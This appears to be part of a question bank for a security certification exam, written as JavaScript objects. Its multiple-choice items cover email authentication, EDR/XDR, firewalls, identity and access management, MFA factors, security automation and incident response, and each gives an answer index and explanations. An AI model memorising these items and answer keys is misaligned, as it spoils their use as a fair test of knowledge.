  { id:"D4-075", domain:4, obj:"4.5", diff:"medium", q:"A domain owner wants to instruct receiving servers to quarantine or reject mail that fails SPF and DKIM checks, and to receive reports. Which record provides this?", options:["PTR","MX","DMARC","SPF"], answer:2, explain:"<strong>DMARC</strong> builds on SPF and DKIM to publish a policy of none, quarantine, or reject for failing mail and to deliver aggregate and forensic reports to the domain owner.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SPF</b>: SPF only lists authorized sending hosts and offers no enforcement policy or reporting back to the domain owner.</span><span class='qd'><b>PTR</b>: a PTR record provides reverse DNS mapping of an IP to a hostname, used for sanity checks but not for setting mail-failure policy.</span><span class='qd'><b>MX</b>: an MX record specifies which servers receive mail for a domain and has nothing to do with handling authentication failures.</span>" },
  { id:"D4-076", domain:4, obj:"4.5", diff:"medium", q:"Which tool establishes behavioral baselines for users and entities and flags statistically anomalous activity such as impossible-travel logins?", options:["SIEM correlation rules","Antivirus signatures","A jump server","UEBA"], answer:3, explain:"<strong>UEBA</strong> builds baselines of normal user and entity behavior and flags statistical deviations such as impossible-travel logins that signature tools cannot catch.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SIEM correlation rules</b>: correlation rules match predefined logic across logs, but they detect known conditions rather than learning behavioral baselines to spot anomalies.</span><span class='qd'><b>Antivirus signatures</b>: signature matching identifies known malware files and cannot model user behavior or detect anomalous login patterns.</span><span class='qd'><b>A jump server</b>: a jump server is a hardened administrative pivot host for controlled access, not an analytics tool that detects anomalies.</span>" },
  { id:"D4-077", domain:4, obj:"4.5", diff:"hard", q:"A security team needs cross-layer correlation that combines endpoint, network, email, and cloud telemetry into a single detection and response platform. Which solution BEST fits?", options:["XDR","NAC","DLP","EDR"], answer:0, explain:"<strong>XDR</strong> unifies and correlates telemetry across endpoint, network, email, and cloud control points into a single detection and response platform, going beyond endpoint-only tools.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>EDR</b>: EDR focuses on endpoint telemetry alone and lacks the native cross-layer correlation that the scenario requires.</span><span class='qd'><b>NAC</b>: Network Access Control enforces admission and posture checks for devices joining the network, not multi-source detection and response.</span><span class='qd'><b>DLP</b>: Data Loss Prevention monitors and blocks sensitive data from leaving, which is a narrow data-protection function, not cross-layer threat correlation.</span>" },
  { id:"D4-078", domain:4, obj:"4.5", diff:"medium", q:"An EDR agent detects a never-before-seen process spawning suspicious child processes and encrypting files. Which EDR capability is MOST responsible for catching this without a signature?", options:["Allow-listing","Behavioral analysis","Port mirroring","Static hashing"], answer:1, explain:"<strong>Behavioral analysis</strong> observes process actions and parent-child relationships, so it can flag ransomware-like activity even when no known signature exists.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Allow-listing</b>: allow-listing only permits pre-approved programs and would not analyze the runtime behavior of a process that managed to execute.</span><span class='qd'><b>Port mirroring</b>: port mirroring copies network traffic to a monitoring port, a network capture technique unrelated to endpoint process behavior.</span><span class='qd'><b>Static hashing</b>: hashing compares a file against known-bad hashes, which fails by definition against a never-before-seen process with no known hash.</span>" },
  { id:"D4-079", domain:4, obj:"4.5", diff:"hard", q:"A firewall rule base ends with an explicit rule denying all traffic that did not match earlier rules. What is this rule called and why is it a best practice?", options:["NAT overload; it conserves addresses","Implicit allow; it speeds throughput","Explicit deny-all; it ensures only intended traffic is permitted","Stateful inspection; it tracks sessions"], answer:2, explain:"<strong>Explicit deny-all; it ensures only intended traffic is permitted</strong> enforces default-deny, so anything not specifically allowed by an earlier rule is blocked, reducing accidental exposure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Implicit allow; it speeds throughput</b>: a default-allow posture is the opposite of secure practice, and firewalls instead use an implicit or explicit deny, not an implicit allow.</span><span class='qd'><b>Stateful inspection; it tracks sessions</b>: stateful inspection is a connection-tracking technique, not the bottom-of-list cleanup rule the question describes.</span><span class='qd'><b>NAT overload; it conserves addresses</b>: NAT overload (PAT) maps many internal hosts to one public IP and is an addressing feature, not a deny rule.</span>" },
  { id:"D4-080", domain:4, obj:"4.5", diff:"easy", q:"Which control inspects and filters HTTP/HTTPS requests to block access to disallowed websites by category or URL?", options:["Load balancer","VPN concentrator","Proxy ARP","Web filter"], answer:3, explain:"<strong>Web filter</strong> evaluates requested URLs and content categories over HTTP and HTTPS to permit or deny web access according to policy.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Load balancer</b>: a load balancer distributes incoming requests across multiple servers for availability and performance, not for blocking disallowed sites.</span><span class='qd'><b>VPN concentrator</b>: a VPN concentrator terminates encrypted remote-access tunnels, providing secure connectivity rather than content filtering.</span><span class='qd'><b>Proxy ARP</b>: Proxy ARP lets one device answer ARP requests on behalf of another, a Layer 2 addressing trick with no web-filtering role.</span>" },
  { id:"D4-081", domain:4, obj:"4.5", diff:"medium", q:"Which statement BEST distinguishes signature-based from anomaly-based IDS detection?", options:["Signature-based matches known patterns; anomaly-based flags deviations from a baseline","They are identical in operation","Signature-based detects only insider threats","Anomaly-based requires a known pattern database"], answer:0, explain:"<strong>Signature-based matches known patterns; anomaly-based flags deviations from a baseline</strong> correctly captures the core difference between the two IDS detection methods.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Signature-based detects only insider threats</b>: signature detection matches known attack patterns regardless of source and is not limited to insiders.</span><span class='qd'><b>Anomaly-based requires a known pattern database</b>: this reverses the concepts, since it is signature-based detection that relies on a known pattern database, while anomaly-based learns a baseline.</span><span class='qd'><b>They are identical in operation</b>: the two methods work fundamentally differently, so claiming they are identical is incorrect.</span>" },
  { id:"D4-082", domain:4, obj:"4.5", diff:"hard", q:"After deploying a new IPS, legitimate database replication traffic is being dropped as malicious. What is the FIRST tuning action?", options:["Disable the IPS entirely","Create an exception/allow rule for the known-good replication traffic","Switch the IPS to span port only","Block all database ports"], answer:1, explain:"<strong>Create an exception/allow rule for the known-good replication traffic</strong> tunes out the false positive, restoring the legitimate flow while keeping protection for everything else in place.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable the IPS entirely</b>: turning off the IPS removes all protection to fix one false positive, an over-correction that exposes the network.</span><span class='qd'><b>Switch the IPS to span port only</b>: moving to a span (mirror) port makes the device passive and detection-only, sacrificing inline blocking instead of tuning the rule.</span><span class='qd'><b>Block all database ports</b>: blocking the ports outright would break the very replication traffic that needs to flow, worsening the problem.</span>" },
  { id:"D4-083", domain:4, obj:"4.5", diff:"medium", q:"Which firewall type makes allow/deny decisions based on application identity and user context rather than only ports and protocols?", options:["Circuit-level gateway","Packet-filtering firewall","Next-generation firewall (NGFW)","Stateless ACL"], answer:2, explain:"<strong>Next-generation firewall (NGFW)</strong> adds deep packet inspection, application awareness, and user identity to traditional filtering, so it decides based on application and user context.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Packet-filtering firewall</b>: a packet filter decides solely on header fields like IP and port and has no awareness of applications or users.</span><span class='qd'><b>Stateless ACL</b>: a stateless access control list matches addresses and ports without tracking sessions or identifying applications.</span><span class='qd'><b>Circuit-level gateway</b>: a circuit-level gateway validates the TCP handshake at the session layer but does not inspect application identity or user context.</span>" },
  { id:"D4-084", domain:4, obj:"4.5", diff:"easy", q:"What does an agent-based EDR primarily monitor?", options:["Only perimeter firewall logs","Physical badge readers","HVAC sensors","Endpoint process, file, and registry activity"], answer:3, explain:"<strong>Endpoint process, file, and registry activity</strong> is what an agent-based EDR records and analyzes on the host to detect and respond to threats.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Only perimeter firewall logs</b>: perimeter firewall logs are network-edge data, whereas EDR agents operate on the endpoint itself.</span><span class='qd'><b>Physical badge readers</b>: badge readers are a physical access control function, not something an endpoint software agent monitors.</span><span class='qd'><b>HVAC sensors</b>: HVAC sensors report environmental conditions and are unrelated to endpoint security telemetry.</span>" },
  { id:"D4-085", domain:4, obj:"4.6", diff:"easy", q:"Which IAM process creates a new user account and grants initial access when an employee is hired?", options:["Provisioning","Recertification","Federation","Deprovisioning"], answer:0, explain:"<strong>Provisioning</strong> establishes the new identity and assigns initial entitlements as part of onboarding a hired employee.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Deprovisioning</b>: deprovisioning removes or disables access when someone leaves or changes roles, the opposite of onboarding.</span><span class='qd'><b>Recertification</b>: recertification periodically reviews whether existing access is still appropriate, not the initial account creation.</span><span class='qd'><b>Federation</b>: federation establishes trust so identities can be used across organizations and does not create a new internal account on hire.</span>" },
  { id:"D4-086", domain:4, obj:"4.6", diff:"easy", q:"Which authentication approach lets a user sign in once and access multiple applications without re-entering credentials?", options:["Mandatory access control","Single sign-on (SSO)","Multifactor authentication","Just-in-time access"], answer:1, explain:"<strong>Single sign-on (SSO)</strong> authenticates the user once and propagates that authenticated session to other trusting applications without re-entry of credentials.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Multifactor authentication</b>: MFA strengthens a single login by requiring multiple factors, but it does not let one sign-in carry across many applications.</span><span class='qd'><b>Just-in-time access</b>: JIT access grants elevated rights only temporarily when needed, addressing privilege duration rather than reusing one authentication.</span><span class='qd'><b>Mandatory access control</b>: MAC is an authorization model based on labels and clearances, not a single-authentication convenience mechanism.</span>" },
  { id:"D4-087", domain:4, obj:"4.6", diff:"medium", q:"Which protocol is an XML-based standard commonly used for web-based SSO and federation between an identity provider and a service provider?", options:["TACACS+","RADIUS","SAML","Kerberos"], answer:2, explain:"<strong>SAML</strong> exchanges XML assertions between an identity provider and a service provider to enable federated web-based single sign-on.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>RADIUS</b>: RADIUS is a network access AAA protocol commonly used for VPN and wireless authentication, not XML-based web federation.</span><span class='qd'><b>Kerberos</b>: Kerberos uses ticket-based authentication within a domain such as a LAN, not XML assertions exchanged for web SSO.</span><span class='qd'><b>TACACS+</b>: TACACS+ is a Cisco AAA protocol focused on device administration command authorization, not browser federation.</span>" },
  { id:"D4-088", domain:4, obj:"4.6", diff:"medium", q:"OAuth 2.0 is primarily a framework for what?", options:["Encrypting data at rest","Directory replication","Authentication of identities","Delegated authorization granting limited access to resources"], answer:3, explain:"<strong>Delegated authorization granting limited access to resources</strong> is the purpose of OAuth 2.0, which issues scoped access tokens without sharing the user's credentials.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Authentication of identities</b>: OAuth 2.0 is an authorization framework; identity authentication is layered on top by OpenID Connect, not by OAuth itself.</span><span class='qd'><b>Encrypting data at rest</b>: data-at-rest encryption is a cryptographic storage control unrelated to delegated access tokens.</span><span class='qd'><b>Directory replication</b>: directory replication synchronizes directory data between servers and has nothing to do with delegated authorization.</span>" },
  { id:"D4-089", domain:4, obj:"4.6", diff:"medium", q:"Which protocol is used to query and modify a directory service such as the one underlying Active Directory?", options:["LDAP","SMTP","SNMP","NTP"], answer:0, explain:"<strong>LDAP</strong> is the protocol used to query and modify distributed directory information services such as the directory underlying Active Directory.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SMTP</b>: SMTP transports email between mail servers and cannot read or write directory entries.</span><span class='qd'><b>SNMP</b>: SNMP monitors and manages network device state and metrics, not directory objects.</span><span class='qd'><b>NTP</b>: NTP synchronizes system clocks and has no directory query capability.</span>" },
  { id:"D4-090", domain:4, obj:"4.6", diff:"medium", q:"A login requires a password and a fingerprint. Which two MFA factor categories are combined?", options:["Two of the same factor","Something you know and something you are","Something you have and somewhere you are","Something you know and something you have"], answer:1, explain:"<strong>Something you know and something you are</strong> is correct because a password is a knowledge factor and a fingerprint is an inherence (biometric) factor, two distinct categories.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Something you have and somewhere you are</b>: neither a password nor a fingerprint is a possession token or a location, so this pairing does not match.</span><span class='qd'><b>Something you know and something you have</b>: a fingerprint is a biometric inherence factor, not a possession factor, so this mislabels the second factor.</span><span class='qd'><b>Two of the same factor</b>: a password and a fingerprint belong to different categories, so combining them is true multifactor, not two of the same.</span>" },
  { id:"D4-091", domain:4, obj:"4.6", diff:"medium", q:"A hardware security key that you plug into a USB port to authenticate represents which MFA factor?", options:["Somewhere you are","Something you know","Something you have","Something you are"], answer:2, explain:"<strong>Something you have</strong> is correct because a physical USB security key is a possession factor that the user must hold to authenticate.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Something you know</b>: a knowledge factor is a memorized secret like a password or PIN, not a physical device.</span><span class='qd'><b>Something you are</b>: an inherence factor is a biometric trait such as a fingerprint, not an object you carry.</span><span class='qd'><b>Somewhere you are</b>: a location factor is based on geolocation or network context, not on possessing a hardware key.</span>" },
  { id:"D4-092", domain:4, obj:"4.6", diff:"hard", q:"In a strict MAC environment, who determines whether a subject can access an object?", options:["Any administrator on request","The subject themselves","The object's owner at their discretion","The system, based on security labels and clearances enforced by policy"], answer:3, explain:"<strong>The system, based on security labels and clearances enforced by policy</strong> is correct because strict MAC has a central authority assign labels that the system enforces, with no owner discretion.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The object's owner at their discretion</b>: owner-driven access is the defining trait of DAC, the opposite of mandatory access control.</span><span class='qd'><b>Any administrator on request</b>: in MAC, access follows fixed label and clearance policy, not ad hoc administrator requests.</span><span class='qd'><b>The subject themselves</b>: subjects in MAC cannot grant themselves access; clearances are assigned and enforced by the system.</span>" },
  { id:"D4-093", domain:4, obj:"4.6", diff:"medium", q:"Which access control model assigns permissions to roles, and users gain permissions by being placed into those roles?", options:["RBAC","Rule-based","DAC","MAC"], answer:0, explain:"<strong>RBAC</strong> grants permissions to roles, and users inherit those permissions through role membership, which simplifies administration.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DAC</b>: DAC lets the resource owner grant access at their discretion rather than assigning permissions through defined roles.</span><span class='qd'><b>MAC</b>: MAC enforces access using security labels and clearances set by policy, not role membership.</span><span class='qd'><b>Rule-based</b>: rule-based access control applies global if-then conditions such as time-of-day restrictions, not permissions tied to user roles.</span>" },
  { id:"D4-094", domain:4, obj:"4.6", diff:"hard", q:"A company needs access decisions based on multiple attributes such as department, device posture, time of day, and data classification. Which model BEST supports this?", options:["RBAC","ABAC","MAC","DAC"], answer:1, explain:"<strong>ABAC</strong> evaluates policies over many attributes of the subject, resource, action, and environment, making it ideal for decisions based on department, device posture, time, and classification.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DAC</b>: DAC bases access on owner discretion and cannot natively weigh multiple contextual attributes for each decision.</span><span class='qd'><b>RBAC</b>: RBAC ties permissions to roles only and lacks the fine-grained, multi-attribute evaluation the scenario demands.</span><span class='qd'><b>MAC</b>: MAC decides by comparing labels to clearances and does not incorporate dynamic attributes like device posture or time of day.</span>" },
  { id:"D4-095", domain:4, obj:"4.6", diff:"medium", q:"In Discretionary Access Control (DAC), who typically controls access to a resource?", options:["The network firewall","A central policy engine","The resource owner","A federation broker"], answer:2, explain:"<strong>The resource owner</strong> is correct because in DAC the owner of an object has discretion to grant or revoke access to other subjects.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A central policy engine</b>: centralized policy-driven decisions describe models like ABAC or MAC, not owner-controlled DAC.</span><span class='qd'><b>A federation broker</b>: a federation broker mediates trust between identity providers and service providers and does not control object-level permissions.</span><span class='qd'><b>The network firewall</b>: a firewall filters network traffic and plays no role in deciding who owns or can share a file resource.</span>" },
  { id:"D4-096", domain:4, obj:"4.6", diff:"hard", q:"Which PAM feature reduces standing privilege by granting elevated rights only for a limited window when a task requires them?", options:["Account lockout threshold","Single sign-on","Password complexity policy","Just-in-time (JIT) access"], answer:3, explain:"<strong>Just-in-time (JIT) access</strong> elevates rights only for a limited window when a task requires them and revokes them automatically, shrinking standing privilege.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Password complexity policy</b>: complexity rules strengthen passwords against guessing but do nothing to limit how long elevated rights persist.</span><span class='qd'><b>Account lockout threshold</b>: lockout thresholds stop brute-force attempts by disabling accounts after failed logins, unrelated to reducing standing privilege.</span><span class='qd'><b>Single sign-on</b>: SSO streamlines authentication across applications and does not time-box or revoke elevated privileges.</span>" },
  { id:"D4-097", domain:4, obj:"4.6", diff:"medium", q:"A privileged access management solution checks out a one-time admin password and rotates it after use. What is this capability called?", options:["Password vaulting with rotation","Kerberos delegation","SAML assertion","Federated identity"], answer:0, explain:"<strong>Password vaulting with rotation</strong> is correct because PAM stores privileged credentials in a vault and automatically rotates them after each checkout to prevent reuse.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Kerberos delegation</b>: Kerberos delegation lets a service act on behalf of a user using tickets, not check out and rotate stored admin passwords.</span><span class='qd'><b>SAML assertion</b>: a SAML assertion is an XML statement conveying authentication for federated SSO, not a credential vaulting mechanism.</span><span class='qd'><b>Federated identity</b>: federated identity establishes cross-organization trust and does not vault or rotate privileged passwords.</span>" },
  { id:"D4-098", domain:4, obj:"4.6", diff:"hard", q:"Which authentication approach removes the password entirely, relying on factors such as FIDO2 security keys or device-bound biometrics?", options:["Basic authentication","Passwordless authentication","Knowledge-based authentication","Shared-secret authentication"], answer:1, explain:"<strong>Passwordless authentication</strong> removes the memorized secret entirely, relying on cryptographic keys such as FIDO2 or device-bound biometrics.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Knowledge-based authentication</b>: KBA depends on secret answers the user knows, which is precisely the password-style factor passwordless eliminates.</span><span class='qd'><b>Shared-secret authentication</b>: a shared secret is a value both parties know, still a knowledge-based credential rather than a passwordless one.</span><span class='qd'><b>Basic authentication</b>: HTTP Basic authentication transmits a username and password (encoded, not encrypted), so it is the opposite of passwordless.</span>" },
  { id:"D4-099", domain:4, obj:"4.6", diff:"easy", q:"What does deprovisioning accomplish?", options:["Adds a user to a new role","Creates new accounts for hires","Removes or disables access when a user leaves or changes roles","Resets a forgotten password"], answer:2, explain:"<strong>Removes or disables access when a user leaves or changes roles</strong> is correct because deprovisioning revokes accounts and entitlements to prevent lingering access after offboarding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Creates new accounts for hires</b>: creating accounts on hire is provisioning, the opposite of deprovisioning.</span><span class='qd'><b>Resets a forgotten password</b>: a password reset restores access for a current user and is a credential maintenance task, not access removal.</span><span class='qd'><b>Adds a user to a new role</b>: adding a user to a role grants access, which is a provisioning or role-change action rather than deprovisioning.</span>" },
  { id:"D4-100", domain:4, obj:"4.6", diff:"medium", q:"Federation allows users from one organization to access another organization's resources. What is the core trust relationship that enables this?", options:["A common VPN tunnel","Identical passwords on both sides","Shared local accounts in each system","A trust between identity providers and service providers"], answer:3, explain:"<strong>A trust between identity providers and service providers</strong> is the core relationship in federation, allowing identities to be used across organizational boundaries.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Shared local accounts in each system</b>: federation specifically avoids duplicating accounts, instead trusting an external identity provider for authentication.</span><span class='qd'><b>A common VPN tunnel</b>: a VPN provides network connectivity, not the identity trust that lets users authenticate across organizations.</span><span class='qd'><b>Identical passwords on both sides</b>: federation relies on assertions and trust, not on matching passwords stored separately in each system.</span>" },
  { id:"D4-101", domain:4, obj:"4.6", diff:"hard", q:"An auditor reviews whether each user's current access is still appropriate and removes entitlements that are no longer needed. Which IAM practice is this?", options:["Access recertification (attestation)","Provisioning","Federation","Tokenization"], answer:0, explain:"<strong>Access recertification (attestation)</strong> is correct because it periodically reviews and validates each user's entitlements, removing access that is no longer needed to enforce least privilege.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Provisioning</b>: provisioning grants initial access during onboarding rather than reviewing whether existing access remains appropriate.</span><span class='qd'><b>Federation</b>: federation establishes cross-organization identity trust and does not audit individual entitlements.</span><span class='qd'><b>Tokenization</b>: tokenization replaces sensitive data with non-sensitive substitute values to protect it, unrelated to reviewing user access.</span>" },
  { id:"D4-102", domain:4, obj:"4.6", diff:"medium", q:"Which factor type is represented by geolocation or network-based conditions such as 'connecting from the corporate office'?", options:["Something you are","Somewhere you are","Something you know","Something you have"], answer:1, explain:"<strong>Somewhere you are</strong> is correct because geolocation or network-based conditions such as connecting from the corporate office represent the location factor.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Something you know</b>: a knowledge factor is a memorized secret like a password, not a physical or network location.</span><span class='qd'><b>Something you have</b>: a possession factor is a device or token the user holds, not where they are connecting from.</span><span class='qd'><b>Something you are</b>: an inherence factor is a biometric trait, not a geographic or network condition.</span>" },
  { id:"D4-103", domain:4, obj:"4.6", diff:"medium", q:"A TOTP code from an authenticator app changes every 30 seconds. Which MFA factor does it represent?", options:["Somewhere you are","Something you know","Something you have","Something you are"], answer:2, explain:"<strong>Something you have</strong> is correct because a TOTP code is generated by a registered device or app the user possesses, making it a possession factor.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Something you know</b>: the TOTP value is not memorized but generated by a device, so it is not a knowledge factor.</span><span class='qd'><b>Something you are</b>: a biometric trait is inherence, whereas a one-time code comes from a possessed device, not the user's body.</span><span class='qd'><b>Somewhere you are</b>: a location factor depends on geography or network, not on holding the device that produces the code.</span>" },
  { id:"D4-104", domain:4, obj:"4.7", diff:"medium", q:"A SOC builds an automated playbook that enriches an alert, opens a ticket, and isolates the host without analyst intervention. Which platform enables this?", options:["SIEM only","DLP","NAC","SOAR"], answer:3, explain:"<strong>SOAR</strong> executes playbooks that automate enrichment, ticketing, and response actions such as host isolation without analyst intervention.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SIEM only</b>: a SIEM aggregates and correlates logs to alert, but on its own it lacks the orchestrated automated response actions the playbook performs.</span><span class='qd'><b>DLP</b>: DLP detects and blocks sensitive data exfiltration and does not orchestrate multi-step incident response workflows.</span><span class='qd'><b>NAC</b>: NAC controls device admission to the network and cannot enrich alerts or run cross-tool response playbooks.</span>" },
  { id:"D4-105", domain:4, obj:"4.7", diff:"easy", q:"What is a primary benefit of automating repetitive security operations tasks?", options:["Reduced human error and faster, consistent response","Elimination of all monitoring needs","Higher false-positive rates","Slower, more deliberate responses"], answer:0, explain:"<strong>Reduced human error and faster, consistent response</strong> is correct because automation enforces speed and consistency while eliminating mistakes from repetitive manual work.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Slower, more deliberate responses</b>: automation speeds response, so slowing it down is the opposite of the benefit.</span><span class='qd'><b>Elimination of all monitoring needs</b>: automation handles tasks but still requires oversight and tuning, so monitoring is not eliminated.</span><span class='qd'><b>Higher false-positive rates</b>: well-designed automation does not inherently raise false positives, and higher false positives would be a drawback, not a benefit.</span>" },
  { id:"D4-106", domain:4, obj:"4.7", diff:"medium", q:"A development pipeline automatically builds, tests, and deploys code when changes are committed. Where should automated security scanning be integrated?", options:["Only after production deployment","Within the CI/CD pipeline (shift left)","Manually once per year","Never, to avoid delays"], answer:1, explain:"<strong>Within the CI/CD pipeline (shift left)</strong> is correct because integrating scanning early in the build, test, and deploy flow catches issues before they reach production.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Only after production deployment</b>: scanning only post-deployment lets vulnerabilities reach production first, the opposite of shifting security left.</span><span class='qd'><b>Manually once per year</b>: an annual manual scan cannot keep pace with continuous commits and leaves long exposure windows.</span><span class='qd'><b>Never, to avoid delays</b>: skipping security scanning trades small pipeline time for major risk and defeats secure development practice.</span>" },
  { id:"D4-107", domain:4, obj:"4.7", diff:"hard", q:"A team worries that overly aggressive automation could take destructive actions on false positives. Which design choice BEST mitigates this risk while keeping automation benefits?", options:["Remove all logging","Disable all automation","Insert a human-in-the-loop approval step for high-impact actions","Automate only after a breach"], answer:2, explain:"<strong>Insert a human-in-the-loop approval step for high-impact actions</strong> is correct because it preserves fast automation for low-risk steps while requiring human judgment before irreversible actions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable all automation</b>: removing automation entirely discards its speed and consistency benefits instead of mitigating just the destructive-action risk.</span><span class='qd'><b>Automate only after a breach</b>: waiting until after a breach offers no proactive protection and does not address false-positive risk.</span><span class='qd'><b>Remove all logging</b>: eliminating logging destroys the visibility needed to investigate and tune, making the situation worse.</span>" },
  { id:"D4-108", domain:4, obj:"4.7", diff:"medium", q:"Which use case is a classic candidate for security automation and orchestration?", options:["Negotiating vendor contracts","Writing the annual security policy","One-off creative threat research","Repetitive phishing-email triage and user account enablement"], answer:3, explain:"<strong>Repetitive phishing-email triage and user account enablement</strong> is correct because high-volume, repeatable, rule-driven tasks are ideal for orchestration and automation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>One-off creative threat research</b>: open-ended research requires human analysis and judgment, which automation cannot replace.</span><span class='qd'><b>Negotiating vendor contracts</b>: contract negotiation is a human business activity with no repeatable security workflow to automate.</span><span class='qd'><b>Writing the annual security policy</b>: policy authoring is a strategic, judgment-driven task, not a repetitive operational process suited to automation.</span>" },
  { id:"D4-109", domain:4, obj:"4.7", diff:"hard", q:"What is a notable drawback of automation/orchestration that teams must plan for?", options:["Complexity and technical debt as playbooks must be updated when systems change","It eliminates the need for any staff","It guarantees zero false negatives","It never requires maintenance"], answer:0, explain:"<strong>Complexity and technical debt as playbooks must be updated when systems change</strong> is correct because automation requires ongoing maintenance, and unmanaged complexity can cause failures when underlying systems evolve.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It never requires maintenance</b>: playbooks and integrations demand continual upkeep, so claiming no maintenance is false.</span><span class='qd'><b>It eliminates the need for any staff</b>: automation augments staff and still needs people to build, tune, and oversee it.</span><span class='qd'><b>It guarantees zero false negatives</b>: no automation can guarantee zero missed detections, and this would be a benefit, not a drawback.</span>" },
  { id:"D4-110", domain:4, obj:"4.8", diff:"easy", q:"What is the FIRST phase of the incident response lifecycle?", options:["Containment","Preparation","Recovery","Lessons learned"], answer:1, explain:"<strong>Preparation</strong> is the first phase of the incident response lifecycle, building the plans, tools, and training that all later phases depend on.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Containment</b>: containment limits the spread of an active incident and occurs only after detection, not first.</span><span class='qd'><b>Recovery</b>: recovery restores systems to normal late in the lifecycle, after containment and eradication.</span><span class='qd'><b>Lessons learned</b>: lessons learned is the final retrospective phase, the opposite end of the lifecycle from preparation.</span>" },
  { id:"D4-111", domain:4, obj:"4.8", diff:"medium", q:"Order the core IR phases that immediately follow detection and analysis.", options:["Recovery, eradication, containment","Recovery, containment, eradication","Containment, eradication, recovery","Eradication, recovery, containment"], answer:2, explain:"<strong>Containment, eradication, recovery</strong> is correct because after detection and analysis responders contain the threat, eradicate it, and then recover normal operations in that order.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Recovery, containment, eradication</b>: recovering before containing would restore systems while the threat is still spreading.</span><span class='qd'><b>Eradication, recovery, containment</b>: eradicating before containment risks ongoing spread, and placing containment last is out of order.</span><span class='qd'><b>Recovery, eradication, containment</b>: this fully reverses the sequence, restoring systems before the threat is even contained.</span>" },
  { id:"D4-112", domain:4, obj:"4.8", diff:"medium", q:"During which IR phase are systems restored to normal operation and validated as clean?", options:["Lessons learned","Detection","Containment","Recovery"], answer:3, explain:"<strong>Recovery</strong> is correct because this phase returns affected systems to production and validates that they are clean and functioning normally.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Detection</b>: detection identifies that an incident is occurring and precedes any restoration of systems.</span><span class='qd'><b>Containment</b>: containment limits the threat's spread but does not restore systems to normal operation.</span><span class='qd'><b>Lessons learned</b>: lessons learned is the post-incident review and does not involve restoring systems.</span>" },
  { id:"D4-113", domain:4, obj:"4.8", diff:"easy", q:"What is the purpose of the lessons-learned phase?", options:["To document findings and improve future response","To delete all incident logs","To immediately restore systems","To assign blame to individuals"], answer:0, explain:"<strong>To document findings and improve future response</strong> is correct because the lessons-learned phase captures what happened and what to improve, feeding back into preparation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To assign blame to individuals</b>: lessons learned is a blameless process focused on improvement, not on punishing people.</span><span class='qd'><b>To delete all incident logs</b>: logs are evidence that should be retained, not destroyed, after an incident.</span><span class='qd'><b>To immediately restore systems</b>: restoring systems is the recovery phase, not the retrospective lessons-learned phase.</span>" },
  { id:"D4-114", domain:4, obj:"4.8", diff:"medium", q:"Which exercise walks stakeholders through a simulated incident scenario via discussion, without touching production systems?", options:["Penetration test","Tabletop exercise","Full failover test","Red team engagement"], answer:1, explain:"<strong>Tabletop exercise</strong> is correct because it is a discussion-based walkthrough of a simulated scenario that validates roles and plans without touching production systems.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Penetration test</b>: a penetration test actively exploits live systems to find weaknesses, the opposite of a discussion-only exercise.</span><span class='qd'><b>Full failover test</b>: a failover test actually switches operations to backup systems, touching live infrastructure rather than just discussing a scenario.</span><span class='qd'><b>Red team engagement</b>: a red team conducts realistic adversarial attacks against real systems, not a passive tabletop discussion.</span>" },
  { id:"D4-115", domain:4, obj:"4.8", diff:"hard", q:"Ransomware is actively spreading across the network. What is the BEST immediate containment action?", options:["Wait for the next scheduled scan","Begin lessons-learned documentation","Isolate or segment affected hosts from the network","Reimage every server simultaneously"], answer:2, explain:"<strong>Isolate or segment affected hosts from the network</strong> is correct because isolating infected hosts limits lateral spread, which is the goal of containment.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Begin lessons-learned documentation</b>: lessons learned comes after the incident is resolved, not while ransomware is actively spreading.</span><span class='qd'><b>Reimage every server simultaneously</b>: mass reimaging is a drastic recovery action that destroys evidence and does not first stop the spread.</span><span class='qd'><b>Wait for the next scheduled scan</b>: waiting lets the ransomware continue propagating, which is the opposite of immediate containment.</span>" },
